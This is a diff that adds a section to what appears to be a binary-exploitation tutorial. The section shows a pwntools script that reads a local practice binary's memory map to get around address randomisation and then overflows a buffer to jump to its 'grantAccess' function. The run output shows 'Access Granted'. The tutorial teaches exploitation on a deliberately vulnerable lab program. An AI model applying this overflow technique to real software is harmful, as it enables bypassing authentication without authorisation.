@@ -1256,6 +1256,51 @@ ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsysca
 
 The base address is `0x5af5bbc3d000` which is randomly generated. The address of `grantAccess` is `0x5af5bbc3e1a9`
 
+Since we need to run the program and inspect it to build the payload, we can't use te command line utilities like `printf` like earlier to pass raw bytes as input. So we can write a python script using `pwntools` which rums the program, inspects it, builds the payload and passes it to the program as raw bytes. 
 
+```py
+#!/usr/bin/env python3
+from pwn import *
 
+# Start the process
+p = process('./vuln')
+
+# Read base address from /proc maps
+with open(f'/proc/{p.pid}/maps') as f:
+    for line in f:
+        if 'r-xp' in line and 'vuln' in line:
+            text_base = int(line.split('-')[0], 16)
+            break
+
+# Calculate grantAccess address
+grant_access = text_base + 0x1a9
+
+log.info(f"PID: {p.pid}")
+log.info(f"Text base: {hex(text_base)}")
+log.info(f"grantAccess: {hex(grant_access)}")
+
+# Build payload
+payload = b'A' * 16 + p64(grant_access)
+
+# Just send it directly (the program is waiting for input)
+p.sendline(payload)
+
+# Receive everything
+output = p.recvall(timeout=1).decode()
+print(output)
+
+p.close()
+```
+
+```bash
+(venv) $ python3 exploit3.py
+[+] Starting local process './vuln': pid 4208
+[*] PID: 4208
+[*] Text base: 0x5dc755119000
+[*] grantAccess: 0x5dc7551191a9
+[+] Receiving all data: Done (53B)
+[*] Stopped process './vuln' (pid 4208)
+Enter password: Authentication Failed
+Access Granted
+```
 
